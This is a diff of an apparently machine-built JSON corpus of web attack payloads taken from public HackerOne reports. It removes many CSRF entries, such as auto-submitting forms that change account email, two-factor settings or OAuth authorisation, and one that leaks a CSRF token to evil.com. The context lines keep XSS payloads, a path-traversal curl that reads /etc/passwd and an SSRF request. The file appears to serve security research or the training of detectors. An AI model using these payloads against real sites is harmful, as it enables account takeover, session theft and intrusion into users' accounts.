@@ -629,23 +629,6 @@
     }
   },
   {
-    "id": "6b9a7472",
-    "class": "csrf",
-    "payload": "<form method=\"POST\" action=\"https://target.com/danlec-test/team_members\"\n     target=\"_blank\">\n  <input type=\"text\" name=\"authenticity_token\" \n     value=\"authenticity_token from the POST to this page\">\n  <input type=\"text\" name=\"invitations_team_member[email]\" \n     value=\"attacker@gmail.com\">\n  <input type=\"hidden\" name=\"team_member[add_as_manager]\" value=\"1\">\n  <input type=\"hidden\" name=\"utf8\" value=\"\u2713\">\n  <input type=\"hidden\" name=\"commit\" value=\"Send invite\">\n  <input type=\"submit\">\n</fo",
-    "technique": "CSRF via an auto\u2011submitting hidden form that includes a captured authenticity_token",
-    "param": null,
-    "report": {
-      "id": 47472,
-      "url": "https://hackerone.com/reports/47472",
-      "title": "CSP Bypass: Click handler for links with data-method=\"post\" can cause authenticity_token to be sent off domain",
-      "program": "HackerOne",
-      "reporter": "danlec",
-      "severity": null,
-      "bounty": 2000.0,
-      "disclosed_at": "2015-02-26"
-    }
-  },
-  {
     "id": "e7096fb2",
     "class": "xss",
     "payload": "$.ajax({ \n  url: \"https://target.com/reports/bulk\", \n  method: 'post', \n  contentType: \"application/json\", \n  data: JSON.stringify({ \n    state: \"open\", \n    substate: \"triaged\", \n    report_ids: [\u2026 id of the report \u2026], \n    reply_action: \"change-state\", \n    reference: {\n      _isReactElement: true,\n      _store: {},\n      type:\"body\",\n      props: {\n        dangerouslySetInnerHTML: {\n          __html:\n            \"<h1>Arbitrary HTML</h1><script>alert('No CSP Support :(')</script>\"\n        }",
@@ -1649,40 +1632,6 @@
     }
   },
   {
-    "id": "7728e469",
-    "class": "csrf",
-    "payload": "<form method=\"POST\" action=\"                                         \">",
-    "technique": "CSRF attack using an auto\u2011submitting HTML form",
-    "param": null,
-    "report": {
-      "id": 100849,
-      "url": "https://hackerone.com/reports/100849",
-      "title": "URGENT : target.com Account Take Over Vulnerability",
-      "program": "X / xAI",
-      "reporter": "hussein98d",
-      "severity": null,
-      "bounty": 560.0,
-      "disclosed_at": "2015-12-21"
-    }
-  },
-  {
-    "id": "c2b24082",
-    "class": "csrf",
-    "payload": "<input type=\"hidden\" name=\"authenticity_token\" value=\"\"/>",
-    "technique": "CSRF attack with hidden authenticity_token field",
-    "param": null,
-    "report": {
-      "id": 100849,
-      "url": "https://hackerone.com/reports/100849",
-      "title": "URGENT : target.com Account Take Over Vulnerability",
-      "program": "X / xAI",
-      "reporter": "hussein98d",
-      "severity": null,
-      "bounty": 560.0,
-      "disclosed_at": "2015-12-21"
-    }
-  },
-  {
     "id": "4a0dd659",
     "class": "xss",
     "payload": "https://target.com/products/c-of-change?shop=evil.com&style=h%20.product-buy-button{x:expression(alert(1",
@@ -1850,23 +1799,6 @@
       "severity": null,
       "bounty": null,
       "disclosed_at": "2016-08-12"
-    }
-  },
-  {
-    "id": "013af1b1",
-    "class": "csrf",
-    "payload": "<html>\n<body>\n <img src=\"https://target.com/auth/twitter/disconnect\">\n  </body>\n</html>",
-    "technique": "CSRF using an <img> tag that triggers a GET request to the Twitter disconnect endpoint",
-    "param": null,
-    "report": {
-      "id": 111216,
-      "url": "https://hackerone.com/reports/111216",
-      "title": "Twitter Disconnect CSRF",
-      "program": "Shopify",
-      "reporter": "akhil-reni",
-      "severity": null,
-      "bounty": null,
-      "disclosed_at": "2016-02-01"
     }
   },
   {
@@ -3060,23 +2992,6 @@
     }
   },
   {
-    "id": "31a54cf7",
-    "class": "csrf",
-    "payload": "<html>\n<body>\n<IFRAME style=\"display:none\" name=\"hidden-form\"></iframe>\n    <form action=\"https://target.com/account/settings/2fa_sms\" method=\"POST\" target=\"hidden-form\" name=\"pocframe\">\n      <input type=\"hidden\" name=\"verify&#95;two&#95;factor\" value=\"1\" />\n      <input type=\"hidden\" name=\"backup\" value=\"\" />\n      <input type=\"hidden\" name=\"app\" value=\"\" />\n      <input type=\"hidden\" name=\"country&#95;code\" value=\"AU\" />\n      <input type=\"hidden\" name=\"phone&#95;number\" value=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
-    "technique": "Cross\u2011Site Request Forgery with hidden form auto\u2011submit to modify Slack 2FA settings",
-    "param": null,
-    "report": {
-      "id": 155774,
-      "url": "https://hackerone.com/reports/155774",
-      "title": "CSRF - Add optional two factor mobile number",
-      "program": "Slack",
-      "reporter": "nhavis",
-      "severity": null,
-      "bounty": 500.0,
-      "disclosed_at": "2016-08-17"
-    }
-  },
-  {
     "id": "af54bc45",
     "class": "xss",
     "payload": "https://target.com/icecream/?lang_id=5%22%20onmouseover%3dprompt(document.domain",
@@ -3125,23 +3040,6 @@
       "severity": null,
       "bounty": null,
       "disclosed_at": "2022-12-13"
-    }
-  },
-  {
-    "id": "6d979a2e",
-    "class": "csrf",
-    "payload": "<html>\n  <body>\n    <form action=\"https://target.com/api/v2/zones\" method=\"POST\">\n      <input type=\"hidden\" name=\"zip\" value=\"10001\" />\n      <input type=\"hidden\" name=\"override\" value=\"true\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>",
-    "technique": "CSRF using auto-submitting hidden HTML form targeting /api/v2/zones",
-    "param": null,
-    "report": {
-      "id": 157993,
-      "url": "https://hackerone.com/reports/157993",
-      "title": "Cross-Site Request Forgery (CSRF)",
-      "program": "Instacart",
-      "reporter": "malcolmx",
-      "severity": null,
-      "bounty": null,
-      "disclosed_at": "2016-10-13"
     }
   },
   {
@@ -3859,74 +3757,6 @@
     }
   },
   {
-    "id": "88dc6a8e",
-    "class": "csrf",
-    "payload": "<form action=\"https://[shop].target.com/admin/products.json\" method=post>\n<input name=\"product[title]\" value=\"API CSRF TEST\">\n<input name=\"product[vendor]\" value=\"test\">\n<input name=\"product[body_html]\" value=\"<h1>API CSRF TEST [Can be stored XSS for admins]</h1>\">\n <input name=\"product[product_type]\" value=\"test\">\n<input type=submit>\n</form>",
-    "technique": "Cross\u2011site request forgery using an auto\u2011submitting HTML form",
-    "param": null,
-    "report": {
-      "id": 195156,
-      "url": "https://hackerone.com/reports/195156",
-      "title": "CSRF in all API endpoints when authenticated using HTTP Authentication",
-      "program": "Shopify",
-      "reporter": "zombiehelp54",
-      "severity": null,
-      "bounty": null,
-      "disclosed_at": "2017-03-28"
-    }
-  },
-  {
-    "id": "cdb26df4",
-    "class": "csrf",
-    "payload": "target.com/[app_id]?authenticity_token=[current_user_authenticity_token]",
-    "technique": "CSRF token exfiltration via query\u2011string token disclosure",
-    "param": "authenticity_token",
-    "report": {
-      "id": 196458,
-      "url": "https://hackerone.com/reports/196458",
-      "title": "target.com - CSRF token leakage through Google Analytics",
-      "program": "Shopify",
-      "reporter": "zombiehelp54",
-      "severity": null,
-      "bounty": null,
-      "disclosed_at": "2017-02-07"
-    }
-  },
-  {
-    "id": "eb2b7867",
-    "class": "csrf",
-    "payload": "https://target.com/[attacker's_app]?authenticity_token=[victim's_token]",
-    "technique": "CSRF token exfiltration via query\u2011string token disclosure",
-    "param": "authenticity_token",
-    "report": {
-      "id": 196458,
-      "url": "https://hackerone.com/reports/196458",
-      "title": "target.com - CSRF token leakage through Google Analytics",
-      "program": "Shopify",
-      "reporter": "zombiehelp54",
-      "severity": null,
-      "bounty": null,
-      "disclosed_at": "2017-02-07"
-    }
-  },
-  {
-    "id": "8fa898ce",
-    "class": "csrf",
-    "payload": "https://target.com/img-src-x-onerror-prompt2?reveal_support=true?authenticity_token=[Your_CSRF_TOKEN]&utf8=%E2%9C%93",
-    "technique": "CSRF token exfiltration via query\u2011string token disclosure",
-    "param": "authenticity_token",
-    "report": {
-      "id": 196458,
-      "url": "https://hackerone.com/reports/196458",
-      "title": "target.com - CSRF token leakage through Google Analytics",
-      "program": "Shopify",
-      "reporter": "zombiehelp54",
-      "severity": null,
-      "bounty": null,
-      "disclosed_at": "2017-02-07"
-    }
-  },
-  {
     "id": "22ebf837",
     "class": "xss",
     "payload": "https://target.com/<>javascript:alert(document.cookie);\nhttps://evil.com/<>javascript:alert(document.cookie);\nhttps://evil2.com/<>javascript:alert(document.cookie);\nhttps://target.com/coffee/coffee,de_DE,sc.html?prefn1=decaffeinated&prefv1=<>javascript:alert('xss parameter');\nhttps://target.com/coffee/coffee,de_DE,sc.html?prefn1=<>javascript:alert('xss parameter');",
@@ -4026,57 +3856,6 @@
       "severity": "high",
       "bounty": null,
       "disclosed_at": "2017-02-24"
-    }
-  },
-  {
-    "id": "f5823d87",
-    "class": "csrf",
-    "payload": "<img src='https://target.com/steal_csrf_token?html=",
-    "technique": "HTML injection of an <img> tag with an unclosed src attribute to exfiltrate the CSRF token",
-    "param": null,
-    "report": {
-      "id": 199779,
-      "url": "https://hackerone.com/reports/199779",
-      "title": "Google Analytics could be used as CSP bypass for data exfiltration on target.com",
-      "program": "HackerOne",
-      "reporter": "aaron_costello",
-      "severity": "low",
-      "bounty": null,
-      "disclosed_at": "2017-03-26"
-    }
-  },
-  {
-    "id": "4d95d9ec",
-    "class": "csrf",
-    "payload": "<img src='https://target.com/steal_csrf_token?html=\n<form action=\"https://evil.com/poc\">\n\n<input type=\"hidden\" name=\"csrf_token\" value=\"some_csrf_token_value\">\n</form>",
-    "technique": "HTML injection of an <img> tag with an unclosed src attribute that captures a hidden form and leaks the CSRF token",
-    "param": null,
-    "report": {
-      "id": 199779,
-      "url": "https://hackerone.com/reports/199779",
-      "title": "Google Analytics could be used as CSP bypass for data exfiltration on target.com",
-      "program": "HackerOne",
-      "reporter": "aaron_costello",
-      "severity": "low",
-      "bounty": null,
-      "disclosed_at": "2017-03-26"
-    }
-  },
-  {
-    "id": "b0cbfc1c",
-    "class": "csrf",
-    "payload": "<img src='https://target.com/collect?v=1&tid=UA-55300588-1&cid=3121525717&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea=\n<p>secret</p>",
-    "technique": "Image tag injection that sends secret data to a Google Analytics endpoint via the ea parameter",
-    "param": null,
-    "report": {
-      "id": 199779,
-      "url": "https://hackerone.com/reports/199779",
-      "title": "Google Analytics could be used as CSP bypass for data exfiltration on target.com",
-      "program": "HackerOne",
-      "reporter": "aaron_costello",
-      "severity": "low",
-      "bounty": null,
-      "disclosed_at": "2017-03-26"
     }
   },
   {
@@ -4349,23 +4128,6 @@
       "severity": null,
       "bounty": null,
       "disclosed_at": "2017-08-29"
-    }
-  },
-  {
-    "id": "2d89648f",
-    "class": "csrf",
-    "payload": "<script>\nwindow.onload = function () { \n  window.setTimeout(function() {\n              document.getElementById(\"token\").innerHTML = \"<iframe src='https://target.com/users/auth/shopify?shop=evil2.com'></iframe>\";   \n          }, 5000);\n          window.setTimeout(function() {\n               window.open('https://evil.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fevil3.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2C",
-    "technique": "CSRF delivering malicious HTML/JS that injects an iframe and auto\u2011submits a login form",
-    "param": null,
-    "report": {
-      "id": 211477,
-      "url": "https://hackerone.com/reports/211477",
-      "title": "Stealing users' facebook access tokens - target.com",
-      "program": "Shopify",
-      "reporter": "zombiehelp54",
-      "severity": null,
-      "bounty": null,
-      "disclosed_at": "2017-03-15"
     }
   },
   {
@@ -5012,23 +4774,6 @@
       "severity": "medium",
       "bounty": null,
       "disclosed_at": "2021-03-11"
-    }
-  },
-  {
-    "id": "e116a121",
-    "class": "csrf",
-    "payload": "<html>\n  <body>\n    <form action=\"https://target.com/accounts/complete/ubuntu/?janrain_nonce=2017-05-02T19%3A42%3A15ZmPYI5n\" method=\"POST\">\n      <input type=\"hidden\" name=\"openid&#46;usernamesecret\" value=\"\" />\n      <input type=\"hidden\" name=\"openid&#46;response&#95;nonce\" value=\"2017&#45;05&#45;02T19&#58;45&#58;57ZW2aGkl\" />\n      <input type=\"hidden\" name=\"openid&#46;ax&#46;count&#46;old&#95;email\" value=\"0\" />\n      <input type=\"hidden\" name=\"openid&#46;ax&#46;type&#46;email\" value=\"h",
-    "technique": "Cross\u2011Site Request Forgery using an auto\u2011submitted HTML form with hidden OpenID fields",
-    "param": null,
-    "report": {
-      "id": 225653,
-      "url": "https://hackerone.com/reports/225653",
-      "title": "Account Takeover using Third party Auth CSRF",
-      "program": "Weblate",
-      "reporter": "ansariosama",
-      "severity": "high",
-      "bounty": null,
-      "disclosed_at": "2017-05-17"
     }
   },
   {
@@ -5763,23 +5508,6 @@
     }
   },
   {
-    "id": "b9f2c18b",
-    "class": "csrf",
-    "payload": "POST /users/$username/preferences/email.json HTTP/1.1\n\u00a0\n_method=PUT&email=$attacker_email&authenticity_token=$csrf_token",
-    "technique": "CSRF exploit using forged POST request with _method=PUT and authenticity_token",
-    "param": null,
-    "report": {
-      "id": 260697,
-      "url": "https://hackerone.com/reports/260697",
-      "title": "CSRF-tokens on pages without no-cache headers, resulting in ATO when using CloudFlare proxy (Web Cache Deception)",
-      "program": "Discourse",
-      "reporter": "fransrosen",
-      "severity": "low",
-      "bounty": null,
-      "disclosed_at": "2018-08-08"
-    }
-  },
-  {
     "id": "07dcbe11",
     "class": "xss",
     "payload": "https://target.com//x:1/:///%01javascript:alert(document.cookie)/",
@@ -5845,23 +5573,6 @@
       "severity": "medium",
       "bounty": 2000.0,
       "disclosed_at": "2017-09-26"
-    }
-  },
-  {
-    "id": "40581d20",
-    "class": "csrf",
-    "payload": "<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://target.com/manage/personal_key\">\n      <input type=\"hidden\" name=\"resend\" value=\"true\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>",
-    "technique": "CSRF via auto\u2011submitting hidden form",
-    "param": null,
-    "report": {
-      "id": 263512,
-      "url": "https://hackerone.com/reports/263512",
-      "title": "CSRF in generating a new Personal Key",
-      "program": "GSA Bounty",
-      "reporter": "streaak",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2017-11-17"
     }
   },
   {
@@ -6919,23 +6630,6 @@
     }
   },
   {
-    "id": "46dc536c",
-    "class": "csrf",
-    "payload": "<html>\n  <body>\n    <form action=\"https://target.com/settings/linkemail\" method=\"POST\">\n      <input type=\"hidden\" name=\"fkey\" value=\"CSRF_token\" />\n      <input type=\"hidden\" name=\"email\" value=\"[attacker-email-address]\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>",
-    "technique": "CSRF attack using a malicious auto\u2011submitted HTML form",
-    "param": "email",
-    "report": {
-      "id": 308394,
-      "url": "https://hackerone.com/reports/308394",
-      "title": "CSRF token fixation and potential account takeover",
-      "program": "Khan Academy",
-      "reporter": "co0nan",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2018-04-19"
-    }
-  },
-  {
     "id": "c9f1b1dc",
     "class": "path-traversal",
     "payload": "$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd",
@@ -7854,23 +7548,6 @@
     }
   },
   {
-    "id": "21146915",
-    "class": "csrf",
-    "payload": "<!doctype html>\n<html>\n<head>\n</head> \n<body>\n<form action=\"https://target.com/v3/subscriptions\" method=\"POST\">\n<input type=\"hidden\" name=\"free_trial\" id=\"free_trial\" value=\"true\">\n<input type=\"hidden\" name=\"promo\" id=\"promo\" value=\"true\">\n<input type=\"hidden\" name=\"term\" id=\"term\" value=\"year\">\n<input type=\"submit\">\n</form>\n</body>\n</html>",
-    "technique": "Cross\u2011Site Request Forgery using a malicious HTML form that posts to the victim site",
-    "param": null,
-    "report": {
-      "id": 334139,
-      "url": "https://hackerone.com/reports/334139",
-      "title": "CSRF Trial 14 days express subscription",
-      "program": "Instacart",
-      "reporter": "tolo7010",
-      "severity": null,
-      "bounty": null,
-      "disclosed_at": "2019-02-27"
-    }
-  },
-  {
     "id": "460f71bd",
     "class": "xss",
     "payload": "<script>history.pushState('', '', '/')</script>",
@@ -8055,23 +7732,6 @@
       "severity": "critical",
       "bounty": 1500.0,
       "disclosed_at": "2018-08-01"
-    }
-  },
-  {
-    "id": "5dcc0be2",
-    "class": "csrf",
-    "payload": "<html>\n<head>\n<script>\nfunction calculate_load_times() {\n  // Check performance support\n  if (performance === undefined) {\n    console.log(\"= Calculate Load Times: performance NOT supported\");\n    return;\n  }\n\n  // Get a list of \"resource\" performance entries\n  var resources = performance.getEntriesByType(\"resource\");\n  if (resources === undefined || resources.length <= 0) {\n    console.log(\"= Calculate Load Times: there are NO `resource` performance records\");\n    return;\n  }\n\n  console.log(\"= ",
-    "technique": "CSRF using malicious image tags to trigger authenticated requests and measure load time via the Performance API",
-    "param": null,
-    "report": {
-      "id": 348168,
-      "url": "https://hackerone.com/reports/348168",
-      "title": "Timing attack towards endpoints on the web without CSRF ",
-      "program": "HackerOne",
-      "reporter": "b258ea62bf297b02afa9854",
-      "severity": "low",
-      "bounty": null,
-      "disclosed_at": "2018-12-27"
     }
   },
   {
@@ -13243,23 +12903,6 @@
     }
   },
   {
-    "id": "81565ef2",
-    "class": "csrf",
-    "payload": "<html>\n  <body>\n    <form action=\"https://\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588/\u2588\u2588\u2588/\">\n      <input type=\"hidden\" name=\"action\" value=\"delete&#95;profile\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>",
-    "technique": "CSRF attack using a malicious HTML form that triggers a delete_profile action",
-    "param": null,
-    "report": {
-      "id": 799855,
-      "url": "https://hackerone.com/reports/799855",
-      "title": "CSRF - Delete Account (Urgent)",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "ahmd_halabi",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2022-03-18"
-    }
-  },
-  {
     "id": "c829d276",
     "class": "xss",
     "payload": "{\n  \"swagger\" : \"2.0\",\n  \"info\" : {\n    \"description\" : \"<a href=https://target.com/yvvdwf/data/-/wikis/evil.com data-type=script style='cursor:default' data-remote=true class='atwho-view select2-drop-mask pika-select'></a><script>alert(0)</script>\"\n  }}",
@@ -13464,40 +13107,6 @@
     }
   },
   {
-    "id": "2a420945",
-    "class": "csrf",
-    "payload": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://target.com/users/sign_in\" method=\"POST\">\n      <input type=\"hidden\" name=\"user[email]\" value=\"youremail\" />\n      <input type=\"hidden\" name=\"user[password]\" value=\"yourpassword\" />\n      <input type=\"hidden\" name=\"user[remember_me]\" value=\"1\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>",
-    "technique": "CSRF using auto-submitting hidden form to hijack user action",
-    "param": null,
-    "report": {
-      "id": 834366,
-      "url": "https://hackerone.com/reports/834366",
-      "title": "Login CSRF vulnerability on target.com",
-      "program": "HackerOne",
-      "reporter": "what_web",
-      "severity": "low",
-      "bounty": 500.0,
-      "disclosed_at": "2020-06-12"
-    }
-  },
-  {
-    "id": "563df193",
-    "class": "csrf",
-    "payload": "<form action=\"[domain]/wp-admin/users.php\">",
-    "technique": "Cross\u2011Site Request Forgery using a hidden form to delete a BuddyPress field",
-    "param": null,
-    "report": {
-      "id": 836187,
-      "url": "https://hackerone.com/reports/836187",
-      "title": "CSRF in Profile Fields allows deleting any field in BuddyPress",
-      "program": "WordPress",
-      "reporter": "hoangkien1020",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2020-05-22"
-    }
-  },
-  {
     "id": "1333560a",
     "class": "path-traversal",
     "payload": "{\"type\":\"form-update\",\"element\":\"#algo-id\",\"value\":\"/../../../../../users/user?prefs%5Bsend_login_detected_email%5D=false\",\"clientId\":\"x\",\"roomId\":\"5ce6e50b298f7c6e0acb68c6\"}",
@@ -13580,23 +13189,6 @@
       "severity": "high",
       "bounty": 2000.0,
       "disclosed_at": "2020-07-28"
-    }
-  },
-  {
-    "id": "c93ed5ae",
-    "class": "csrf",
-    "payload": "<form action=\"https://target.com/authorization.json\" method=\"POST\">\n      <input type=\"hidden\" name=\"client&#95;id\" value=\"{your-client-id}\" />\n      <input type=\"hidden\" name=\"client&#95;secret\" value=\"\" />\n      <input type=\"hidden\" name=\"type\" value=\"web&#95;server\" />\n      <input type=\"hidden\" name=\"redirect&#95;uri\" value=\"{your-redirect-uri}\" />\n      <input type=\"hidden\" name=\"commit\" value=\"\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>",
-    "technique": "Cross\u2011Site Request Forgery using a hidden auto\u2011submitting HTML form targeting the OAuth2 authorization endpoint",
-    "param": null,
-    "report": {
-      "id": 850022,
-      "url": "https://hackerone.com/reports/850022",
-      "title": "CSRF on target.com OAuth2 authorization endpoint",
-      "program": "Basecamp",
-      "reporter": "carbon61",
-      "severity": "high",
-      "bounty": null,
-      "disclosed_at": "2020-10-30"
     }
   },
   {
@@ -14158,23 +13750,6 @@
       "severity": "medium",
       "bounty": null,
       "disclosed_at": "2020-08-03"
-    }
-  },
-  {
-    "id": "5091e848",
-    "class": "csrf",
-    "payload": "<html>\n  <body>\n    <form action=\"https://[WP]/wp-admin/admin-ajax.php\" method=\"POST\">\n      <input type=\"hidden\" name=\"attachment_id\" value=\"5\" />\n      <input type=\"hidden\" name=\"action\" value=\"set-background-image\" />\n      <input type=\"hidden\" name=\"size\" value=\"thumbnail\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>",
-    "technique": "Cross\u2011Site Request Forgery via hidden auto\u2011submit form",
-    "param": null,
-    "report": {
-      "id": 881855,
-      "url": "https://hackerone.com/reports/881855",
-      "title": "Arbitrary change of blog's background image via CSRF",
-      "program": "WordPress",
-      "reporter": "erwan_lr",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2020-12-14"
     }
   },
   {
@@ -15861,23 +15436,6 @@
     }
   },
   {
-    "id": "8e4913c3",
-    "class": "csrf",
-    "payload": "var FormEl = `\n<form action=\"https://target.com/change_email\" method=\"POST\">\n        <input type=\"hidden\" name=\"email\" value=\"nnez+attacker@wearehackerone.com\" />\n        <button type=\"submit\" style=\"font-size:28pt;z-index:99999\">Submit</button>\n    </form>\n`;\nvar Div = document.createElement('div');\nDiv.innerHTML = FormEl;\ndocument.body.appendChild(Div);",
-    "technique": "CSRF using an auto\u2011submitted hidden form to change the email address",
-    "param": null,
-    "report": {
-      "id": 975983,
-      "url": "https://hackerone.com/reports/975983",
-      "title": "Site-wide CSRF on Safari due to CORS misconfiguration (not localhost)",
-      "program": "CS Money",
-      "reporter": "nnez",
-      "severity": "medium",
-      "bounty": 300.0,
-      "disclosed_at": "2020-10-27"
-    }
-  },
-  {
     "id": "926658ce",
     "class": "xss",
     "payload": "<script src='$Value'>",
@@ -16303,23 +15861,6 @@
     }
   },
   {
-    "id": "1a1d717b",
-    "class": "csrf",
-    "payload": "<html>\n\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n\n  <body>\n\n  <script>history.pushState('', '', '/')</script>\n\n    <form action=\"https://target.com/svc/user/filtered_content\" method=\"POST\">\n\n      <input type=\"hidden\" name=\"filtered&#95;content\" value=\"pwd777\" />\n\n      <input type=\"submit\" value=\"Submit request\" />\n\n    </form>\n\n  </body>\n\n</html>",
-    "technique": "Cross\u2011Site Request Forgery using an auto\u2011submitted hidden form (POST)",
-    "param": null,
-    "report": {
-      "id": 1010806,
-      "url": "https://hackerone.com/reports/1010806",
-      "title": "[target.com] CSRF in /svc/user/filtered_content",
-      "program": "Automattic",
-      "reporter": "fuzzme",
-      "severity": "low",
-      "bounty": null,
-      "disclosed_at": "2020-12-26"
-    }
-  },
-  {
     "id": "a8aa7217",
     "class": "xss",
     "payload": "<a+href=\"ja%0A%0Dvascript:alert(document.domain)\">Click</a>",
@@ -16334,23 +15875,6 @@
       "severity": "medium",
       "bounty": null,
       "disclosed_at": "2021-01-25"
-    }
-  },
-  {
-    "id": "86b06347",
-    "class": "csrf",
-    "payload": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" method=\"POST\">\n      <input type=\"hidden\" name=\"keyword\" value=\"&lt;a&#32;href&#61;https&#58;&#47;&#47;naglinagli&#46;github&#46;io&gt;Click&#32;here&#32;to&#32;win&#32;1000&#36;&#33;&lt;&#47;a&gt;\" />\n      <input type=\"hidden\" name=\"Find&#32;Case&#32;Studies\" value=\"Find&#32;Case&#32;Studies\" />\n      <input type=\"hidden\" name=\"crim",
-    "technique": "CSRF page that submits hidden fields containing stored HTML injection",
-    "param": null,
-    "report": {
-      "id": 1014593,
-      "url": "https://hackerone.com/reports/1014593",
-      "title": "CSRF to Stored HTML injection at https://www.\u2588\u2588\u2588\u2588\u2588",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "nagli",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2020-12-03"
     }
   },
   {
@@ -19482,23 +19006,6 @@
     }
   },
   {
-    "id": "81aa312e",
-    "class": "csrf",
-    "payload": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\" method=\"POST\">\n      <input type=\"hidden\" name=\"ctl00&#95;ToolkitScriptManager1&#95;HiddenField\" value=\"\" />\n      <input type=\"hidden\" name=\"ctl00&#36;masterContentHolder&#36;wizardCreateNewUser&#36;CreateUserStepContainer&#36;textboxFirstName\" value=\"df\" />\n      <input type=\"hidden\" name=\"ctl00&#36;masterContentHolder&#36;wizardCreat",
-    "technique": "CSRF using an auto\u2011submitting hidden form with many pre\u2011filled fields",
-    "param": null,
-    "report": {
-      "id": 1090838,
-      "url": "https://hackerone.com/reports/1090838",
-      "title": "CSRF in  https://\u2588\u2588\u2588",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "blackangel11",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2021-04-20"
-    }
-  },
-  {
     "id": "c10d6510",
     "class": "xss",
     "payload": "<html dir=\"ltr\"><head><meta charset=\"utf-8\"><title>Rocket.Chat.Livechat</title><meta\nname=\"viewport\" content=\"width=device-width,initial-scale=1\"><link rel=\"stylesheet\"\ntype=\"text/css\" href=\"/livechat/61.chunk.a8a84.css\"><script charset=\"utf-8\"\nsrc=\"/livechat/61.chunk.6a8fa.js\"></script><link rel=\"stylesheet\" type=\"text/css\"\nhref=\"/livechat/62.chunk.e3920.css\"><script charset=\"utf-8\"\nsrc=\"/livechat/62.chunk.39808.js\"></script><script charset=\"utf-8\"\nsrc=\"/livechat/i18n.en.chunk.2a3c0.js\"></scrip",
@@ -19856,23 +19363,6 @@
     }
   },
   {
-    "id": "273c8f83",
-    "class": "csrf",
-    "payload": "<html>\n  <!-- CSRF PoC - generated by Burp Suite Professional -->\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\" method=\"POST\">\n      <input type=\"hidden\" name=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&#45;building\" value=\"&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;document&#46;domain&#41;&gt;\" />\n      <input type=\"hidden\" name=\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&#45;classroom\" value=\"&quot;&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;document&#46;domain&#41;&gt;\" />\n      <i",
-    "technique": "CSRF attack with auto-submitting form containing hidden fields that inject XSS payloads",
-    "param": null,
-    "report": {
-      "id": 1118501,
-      "url": "https://hackerone.com/reports/1118501",
-      "title": "CSRF to Cross-site Scripting (XSS)",
-      "program": "U.S. Dept Of Defense",
-      "reporter": "lu3ky-13",
-      "severity": "medium",
-      "bounty": null,
-      "disclosed_at": "2021-03-24"
-    }
-  },
-  {
     "id": "afc7f944",
     "class": "ssrf",
     "payload": "curl -i -s -k -X $'GET' \\\n    -H $'Host: \u2588\u2588\u2588\u2588\u2588' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \\\n    -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/l",
@@ -19890,23 +19380,6 @@
     }
   },
   {
-    "id": "119ac9d7",
-    "class": "csrf",
-    "payload": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <meta name=\"referrer\" content=\"none\">\n    <meta name=\"referrer\" content=\"no-referrer\">\n</head>\n<body>\n      <form action=\"https://target.com/api/graphql/\" id=\"csrf-form\" method=\"GET\">\n        <input name=\"query\" value=\"mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $",
-    "technique": "CSRF using auto-submitting GET form to GitLab GraphQL mutation",
-    "param": null,
-    "report": {
-      "id": 1122408,
-      "url": "https://hackerone.com/reports/1122408",
-      "title": "CSRF on /api/graphql allows executing mutations through GET requests",
-      "program": "GitLab",
-      "reporter": "az3z3l",
-      "severity": "high",
-      "bounty": 3370.0,
-      "disclosed_at": "2021-08-02"
-    }
-  },
-  {
